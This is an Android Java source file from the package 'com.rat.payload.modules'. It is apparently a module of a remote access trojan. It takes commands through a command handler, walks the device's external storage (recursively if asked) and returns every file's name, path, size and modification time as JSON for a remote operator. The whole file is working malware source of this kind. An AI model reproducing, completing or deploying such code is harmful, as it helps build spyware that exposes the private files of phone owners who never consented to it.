package com.rat.payload.modules;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;

public class FileModule implements CommandHandler.Command {

    private static final String TAG = "FileModule";
    private Context context;

    public FileModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            String path = args.optString("path", Environment.getExternalStorageDirectory().getAbsolutePath());
            boolean recursive = args.optBoolean("recursive", false);
            File dir = new File(path);
            if (!dir.exists()) {
                result.put("error", "Path does not exist: " + path);
                return result;
            }
            JSONArray files = new JSONArray();
            listFiles(dir, files, recursive, 0);
            result.put("files", files);
            result.put("path", path);
        } catch (Exception e) {
            Log.e(TAG, "file error: " + e.getMessage());
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    private void listFiles(File dir, JSONArray files, boolean recursive, int depth) {
        if (depth > 3 && !recursive) return;
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            try {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", f.getName());
                fileObj.put("path", f.getAbsolutePath());
                fileObj.put("size", f.length());
                fileObj.put("isDirectory", f.isDirectory());
                fileObj.put("lastModified", f.lastModified());
                files.put(fileObj);
                if (f.isDirectory() && recursive) {
                    listFiles(f, files, true, depth + 1);
                }
            } catch (Exception e) {
                Log.e(TAG, "list error: " + e.getMessage());
            }
        }
    }
}
